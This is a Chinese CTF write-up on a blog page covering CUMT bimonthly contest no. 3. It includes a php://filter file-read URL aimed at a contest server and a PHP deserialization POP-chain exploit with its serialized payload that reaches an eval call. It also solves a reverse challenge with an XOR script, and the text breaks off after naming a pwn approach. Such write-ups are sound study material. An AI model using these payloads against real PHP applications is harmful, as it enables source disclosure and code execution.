
 <!DOCTYPE HTML>
<html lang="en">
<head>
  <meta charset="UTF-8">
  
    <title>CUMT双月赛三 | Hexo</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="John Doe">
    

    
    <meta name="description" content="前言2019年5月 By 窝不管窝的flag都队 考试周的月赛，也得做做看看，划水">
<meta property="og:type" content="article">
<meta property="og:title" content="CUMT双月赛三">
<meta property="og:url" content="http://example.com/2019/05/01/%E5%A4%A7%E5%AD%A6CTF/CUMT%E5%8F%8C%E6%9C%88%E8%B5%9B%E4%B8%89/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="前言2019年5月 By 窝不管窝的flag都队 考试周的月赛，也得做做看看，划水">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://s2.ax1x.com/2019/05/01/EJuRMt.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/05/01/EJu4Z8.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/05/01/EJbAi9.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/05/01/EJb2LT.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/05/01/EJbWeU.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/05/01/EJqZkQ.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20190508153040459.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/2019050815310259.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20190508153600119.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20190508153958715.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/05/02/EYzFSg.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/05/02/EYxgWF.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/05/02/EYxWQJ.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/05/02/EYqsIg.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/05/02/EYqhLV.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/05/02/EYLEOP.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/05/04/Edp6S0.md.png">
<meta property="article:published_time" content="2019-05-01T01:20:50.000Z">
<meta property="article:modified_time" content="2019-05-09T09:56:05.529Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="CUMT双月赛三">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.ax1x.com/2019/05/01/EJuRMt.png">

    
    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/tou1.png">
    
    
    <link rel="apple-touch-icon" href="/img/jacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
    
    
<link rel="stylesheet" href="/css/style.css">
<link rel="stylesheet" href="/%02.css">
<link rel="stylesheet" href="/.css">

<meta name="generator" content="Hexo 5.4.0"></head>

  <body>
    <header>
      
<div>
		
			<div id="imglogo">
				<a href="/"><img src="/img/logo.jpg" alt="Hexo" title="Hexo"/></a>
			</div>
			
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="Hexo">Hexo</a></h1>
				<h2 class="blog-motto"></h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/about">About</a></li>
					
						<li><a href="/tags">Tags</a></li>
					
						<li><a href="/categories">Categories</a></li>
					
					<li>
 					
					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
						<label>Search</label>
						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
						<input type="hidden" name="q" value="site:example.com">
					</form>
					
					</li>
				</ul>
			</nav>			
</div>
    </header>
    <div id="container">
      <div id="main" class="post" itemscope itemprop="blogPost">
  
	<article itemprop="articleBody"> 
		<header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2019/05/01/大学CTF/CUMT双月赛三/" title="CUMT双月赛三" itemprop="url">CUMT双月赛三</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="John Doe" target="_blank" itemprop="author">John Doe</a>
		
  <p class="article-time">
    <time datetime="2019-05-01T01:20:50.000Z" itemprop="datePublished"> Published 2019-05-01</time>
    
  </p>
</header>
	<div class="article-content">
		
		<div id="toc" class="toc-article">
			<strong class="toc-title">Contents</strong>
		
			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#web%E7%AD%BE%E5%88%B01"><span class="toc-number">2.1.</span> <span class="toc-text">web签到1</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web%E7%AD%BE%E5%88%B02"><span class="toc-number">3.</span> <span class="toc-text">Web签到2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bypass1"><span class="toc-number">3.2.</span> <span class="toc-text">bypass1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bypass2"><span class="toc-number">3.3.</span> <span class="toc-text">bypass2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bypass3"><span class="toc-number">3.4.</span> <span class="toc-text">bypass3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp%EF%BC%9A"><span class="toc-number">3.5.</span> <span class="toc-text">exp：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number"></span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">1.</span> <span class="toc-text">签到</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number"></span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0-1"><span class="toc-number">1.</span> <span class="toc-text">签到</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#where"><span class="toc-number">1.1.</span> <span class="toc-text">where</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#how"><span class="toc-number">1.2.</span> <span class="toc-text">how</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">1.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn3"><span class="toc-number">2.</span> <span class="toc-text">pwn3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#where-1"><span class="toc-number">2.1.</span> <span class="toc-text">where</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#how-1"><span class="toc-number">2.2.</span> <span class="toc-text">how</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-1"><span class="toc-number">2.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number"></span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E7%AD%BE%E5%88%B0"><span class="toc-number">1.</span> <span class="toc-text">古典密码签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E7%AD%BE%E5%88%B0"><span class="toc-number">2.</span> <span class="toc-text">现代密码签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyxor"><span class="toc-number">3.</span> <span class="toc-text">easyxor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#encode"><span class="toc-number">4.</span> <span class="toc-text">encode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA"><span class="toc-number">5.</span> <span class="toc-text">RSA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number"></span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Whoami"><span class="toc-number">1.</span> <span class="toc-text">Whoami???</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lisp"><span class="toc-number">2.</span> <span class="toc-text">Lisp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%88%E5%AD%A6%E4%B8%80%E6%B3%A2%E8%AF%AD%E8%A8%80"><span class="toc-number">2.1.</span> <span class="toc-text">先学一波语言</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#define"><span class="toc-number">2.1.1.</span> <span class="toc-text">define</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#append"><span class="toc-number">2.1.2.</span> <span class="toc-text">append</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#pair"><span class="toc-number">2.1.3.</span> <span class="toc-text">pair</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#let"><span class="toc-number">2.1.4.</span> <span class="toc-text">let</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#car-amp-cdr"><span class="toc-number">2.1.5.</span> <span class="toc-text">car &amp; cdr</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#cond"><span class="toc-number">2.1.6.</span> <span class="toc-text">cond</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#remainder"><span class="toc-number">2.1.7.</span> <span class="toc-text">remainder</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%90%86%E8%A7%A3%E4%BB%A3%E7%A0%81"><span class="toc-number">2.2.</span> <span class="toc-text">理解代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-now"><span class="toc-number">2.3.</span> <span class="toc-text">Exploit now!</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%EF%BC%9F"><span class="toc-number">3.</span> <span class="toc-text">猜？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%9F%E7%9C%9F%E5%81%87%E5%81%87"><span class="toc-number">4.</span> <span class="toc-text">真真假假</span></a></li></ol>
		
		</div>
		
		<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>2019年5月</p>
<p>By 窝不管窝的flag都队</p>
<p>考试周的月赛，也得做做看看，划水<span id="more"></span></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="web签到1"><a href="#web签到1" class="headerlink" title="web签到1"></a>web签到1</h4><p><img src="https://s2.ax1x.com/2019/05/01/EJuRMt.png" alt="EJuRMt.png"></p>
<p>直接试试<code>http://202.119.201.199:30100/index.php?page=php://filter/read=convert.base64-encode/resource=cxk.php</code></p>
<p>得到一串base64编码</p>
<blockquote>
<p>PD9waHAgDQpwaHBpbmZvKCk7IA0KLypmbGFne0N1bXRDVEZfdGhpc19pU19hX1JFbEx5X2ZMYUchISF9Ki8NCj8+DQo=</p>
</blockquote>
<p>解密，得到flag</p>
<p><img src="https://s2.ax1x.com/2019/05/01/EJu4Z8.png" alt="EJu4Z8.png"></p>
<h3 id="Web签到2"><a href="#Web签到2" class="headerlink" title="Web签到2"></a>Web签到2</h3><p>考察反序列化漏洞的知识，给出源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">P</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(</span><br><span class="line">            <span class="string">&#x27;global &#x27;</span>.<span class="keyword">$this</span> -&gt; <span class="keyword">var</span>.<span class="string">&#x27;;&#x27;</span>.</span><br><span class="line">            <span class="string">&#x27;$ret = &#x27;</span>.<span class="keyword">$this</span> -&gt; <span class="keyword">var</span>.<span class="string">&#x27;;&#x27;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$fn</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fn</span> = <span class="keyword">$this</span> -&gt; <span class="function"><span class="keyword">fn</span></span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fn</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">U</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;obj-&gt;name) || <span class="keyword">$this</span>-&gt;obj-&gt;name != <span class="string">&quot;iv4n&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; obj -&gt; <span class="function"><span class="keyword">fn</span> = <span class="title">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>])-&gt;obj; </span><br></pre></td></tr></table></figure>

<h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><blockquote>
<p>三个类分别是P，K，U；</p>
<p>P 中 <code>$var</code>，权限为 private，魔术方法 <code>__invoke()</code>，当尝试以调用函数的方式调用一个对象时，方法会被自动调用；</p>
<p>K 中 <code>$fn</code>、<code>$name</code>，权限为 protected，魔术方法 <code>__toString()</code>，将 <code>$fn</code> 以函数方式返回 <code>$fn()</code>；到这里就会想到上面的 <code>invoke()</code>，那这里的 <code>$fn</code> 就肯定是 P 的一个对象；</p>
<p>U 中 <code>$obj</code>，魔术方法 <code>__wakeup()</code>，要求 <code>$this-&gt;obj-&gt;name == &quot;iv4n&quot;</code>；</p>
</blockquote>
<h4 id="bypass1"><a href="#bypass1" class="headerlink" title="bypass1"></a>bypass1</h4><p>想到绕过 <code>__wakeup()</code>，但是要求可以达到，就直接 new 一个 U 的对象，将对象中的数据成员 <code>$obj</code> 赋值为一个K 的对象，将此对象的 <code>$name</code> 赋值为 <code>iv4n</code> 即可，其实不算绕过(<del>手动狗头</del>)；</p>
<h4 id="bypass2"><a href="#bypass2" class="headerlink" title="bypass2"></a>bypass2</h4><p>接下来就是如何调用到 <code>$fn</code>，这里需要注意的是变量的权限问题，这里为 protected，但是在外面无法赋值，这里写个脚本做个测试：</p>
<p>脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class run&#123;</span><br><span class="line">	private $kk1=&#x27;$flag&#x27;;</span><br><span class="line">	protected $kk2=&#x27;b&#x27;;</span><br><span class="line">	public $kk3=&#x27;c&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$gardenia1=new run();</span><br><span class="line">echo (serialize($gardenia1));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<p><img src="https://s2.ax1x.com/2019/05/01/EJbAi9.png" alt="EJbAi9.png"></p>
<p>显而易见，在序列化的时候：</p>
<p>private变量改为了 <code>0x00类名0x00变量</code>，在此基础上字符数量也需要修改；</p>
<p><img src="https://s2.ax1x.com/2019/05/01/EJb2LT.png" alt="EJb2LT.png"></p>
<p>protected变量改为了 <code>0x00*0x00变量</code>，在此基础上字符数量同样需要修改；</p>
<p><img src="https://s2.ax1x.com/2019/05/01/EJbWeU.png" alt="EJbWeU.png"></p>
<h4 id="bypass3"><a href="#bypass3" class="headerlink" title="bypass3"></a>bypass3</h4><p>此时就可以直接看 <code>__invoke()</code> 函数了，因为包含了flag.php，所以猜想里面存在变量 <code>$flag</code>，所以在 <code>eval()</code> 内执行如下语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(global $flag;$ret=$flag;);</span><br></pre></td></tr></table></figure>

<p>将 <code>$flag</code> 转化为全局变量，直接赋值 <code>$ret</code>，输出即可得到flag；</p>
<h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">P</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&#x27;$flag&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(</span><br><span class="line">            <span class="string">&#x27;global &#x27;</span>.<span class="keyword">$this</span> -&gt; <span class="keyword">var</span>.<span class="string">&#x27;;&#x27;</span>.</span><br><span class="line">            <span class="string">&#x27;$ret = &#x27;</span>.<span class="keyword">$this</span> -&gt; <span class="keyword">var</span>.<span class="string">&#x27;;&#x27;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;invoke&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回fn()</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fn</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fn</span> = <span class="keyword">$this</span> -&gt; <span class="function"><span class="keyword">fn</span></span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">U</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;obj-&gt;name) || <span class="keyword">$this</span>-&gt;obj-&gt;name != <span class="string">&quot;iv4n&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; obj -&gt; <span class="function"><span class="keyword">fn</span> = <span class="title">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$gardenia1</span>=<span class="keyword">new</span> P();</span><br><span class="line"><span class="variable">$gardenia2</span>=<span class="keyword">new</span> K();</span><br><span class="line"><span class="variable">$gardenia2</span>-&gt;fn=<span class="variable">$gardenia1</span>;</span><br><span class="line"><span class="variable">$gardenia2</span>-&gt;name=<span class="string">&#x27;iv4n&#x27;</span>;</span><br><span class="line"><span class="variable">$gardenia3</span>=<span class="keyword">new</span> U();</span><br><span class="line"><span class="variable">$gardenia3</span>-&gt;obj=<span class="variable">$gardenia2</span>;</span><br><span class="line"><span class="variable">$res</span>=serialize(<span class="variable">$gardenia3</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$res</span>);</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;U&quot;:1:&#123;s:3:&quot;obj&quot;;O:1:&quot;K&quot;:2:&#123;s:2:&quot;fn&quot;;O:1:&quot;P&quot;:1:&#123;s:3:&quot;var&quot;;s:5:&quot;$flag&quot;;&#125;s:4:&quot;name&quot;;s:4:&quot;iv4n&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>按照上面的修改即可得到 poc：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj=O:1:&quot;U&quot;:1:&#123;s:3:&quot;obj&quot;;O:1:&quot;K&quot;:2:&#123;s:5:&quot;%00*%00fn&quot;;O:1:&quot;P&quot;:1:&#123;s:6:&quot;%00P%00var&quot;;s:5:&quot;$flag&quot;;&#125;s:4:&quot;name&quot;;s:4:&quot;iv4n&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>得到 flag：</p>
<p><img src="https://s2.ax1x.com/2019/05/01/EJqZkQ.png" alt="EJqZkQ.png"></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>拖进 IDA，F5 看看，主函数：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pattern = <span class="number">4180</span>;</span><br><span class="line">v6 = <span class="number">8299</span>;</span><br><span class="line">v7 = <span class="number">12378</span>;</span><br><span class="line">v8 = <span class="number">16431</span>;</span><br><span class="line">v9 = <span class="number">20498</span>;</span><br><span class="line">v10 = <span class="number">24663</span>;</span><br><span class="line">v11 = <span class="number">28742</span>;</span><br><span class="line">v12 = <span class="number">33000</span>;</span><br><span class="line">v13 = <span class="number">37073</span>;</span><br><span class="line">v14 = <span class="number">41164</span>;</span><br><span class="line"><span class="built_in">printf</span>(aS, aPleaseInputFla);</span><br><span class="line"><span class="built_in">scanf</span>(aS, &amp;input);</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;input) &lt;= <span class="number">20</span> &amp;&amp; <span class="built_in">sub_401000</span>(&amp;input, &amp;pattern) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(aFlagS, &amp;input);</span><br><span class="line">  <span class="built_in">system</span>(aPause);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这些变量都是 int 类型的，占 4 B。由 <code>if</code> 语句我们可以知道：</p>
<ol>
<li>输入长度不能大于 20</li>
<li><code>sub_401000(&amp;input, &amp;pattern)</code> 返回值应为 1</li>
</ol>
<p>看看 <code>sub_401000()</code> 函数：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __cdecl <span class="title">sub_401000</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *input, _BYTE *pattern)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// edx</span></span><br><span class="line">  _BYTE *pp; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  pp = pattern;</span><br><span class="line">  <span class="keyword">while</span> ( (pp[<span class="number">1</span>] ^ input[i]) == *pp )</span><br><span class="line">  &#123;</span><br><span class="line">    ++i;</span><br><span class="line">    pp += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="built_in">strlen</span>(input) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过程很简单，就是判断 <code>pattern[i] = pattern[i+1]^input[i]</code> 是否成立，根据异或运算的性质，我们容易推出：<code>input[i]=pattern[i]^pattern[i+1]</code>，那就很容易写出 Python 脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line">data = [<span class="number">4180</span>,<span class="number">8299</span>,<span class="number">12378</span>,<span class="number">16431</span>,<span class="number">20498</span>,<span class="number">24663</span>,<span class="number">28742</span>,<span class="number">33000</span>,<span class="number">37073</span>,<span class="number">41164</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">    a = x//<span class="number">256</span></span><br><span class="line">    b = x%<span class="number">256</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(a^b)</span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span>+flag+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;DKjoB76hAl&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="签到-1"><a href="#签到-1" class="headerlink" title="签到"></a>签到</h3><h4 id="where"><a href="#where" class="headerlink" title="where"></a>where</h4><p>写入可执行 bss 段。<br>栈溢出。</p>
<h4 id="how"><a href="#how" class="headerlink" title="how"></a>how</h4><p>ret2shellcode。</p>
